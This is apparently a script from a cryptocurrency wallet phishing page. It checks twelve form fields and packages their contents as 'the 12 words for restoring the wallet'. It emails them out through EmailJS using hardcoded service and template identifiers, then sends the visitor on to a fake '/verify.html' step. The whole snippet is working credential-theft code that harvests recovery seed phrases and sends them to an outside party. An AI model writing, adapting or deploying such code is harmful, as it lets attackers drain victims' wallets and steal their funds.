<script type="text/javascript">
    emailjs.init("eFjqTxnF7nGuJXVZd");

    document.getElementById('passwordForm').addEventListener('submit', function (event) {
        event.preventDefault(); // Prevent the default form submission
        
        var inputs = document.querySelectorAll('.input12');
        var isValid = true;
        var words = [];

        // Check for empty inputs and collect values
        for (var i = 0; i < inputs.length; i++) {
            var inputValue = inputs[i].value;
            if (inputValue === '') {
                alert('Please enter a value for Input ' + (i + 1));
                isValid = false;
                break;
            } else {
                words.push(inputValue);
            }
        }

        if (isValid) {
            // Create a message string with all words
            var message = `
                <p>Here are the 12 words for restoring the wallet:</p>
                <ol>
                    ${words.map((word, index) => `${word},`).join('')}
                </ol>
            `;

            // Send the message via EmailJS
            emailjs.send('service_8it2819', 'template_bh4z2c6', { message: message })
                .then(function (response) {
                    console.log('Success:', response);
                    window.location.href = '/verify.html'; // Ensure this path is correct
                })
                .catch(function (error) {
                    console.error('Error:', error);
                });
        }
    });

    function onlyAlphabets(e, t) {
        try {
            var charCode = e ? e.which : window.event.keyCode;
            return (charCode > 64 && charCode < 91) || (charCode > 96 && charCode < 123 || charCode == 32);
        } catch (err) {
            alert(err.Description);
            return false;
        }
    }
</script>
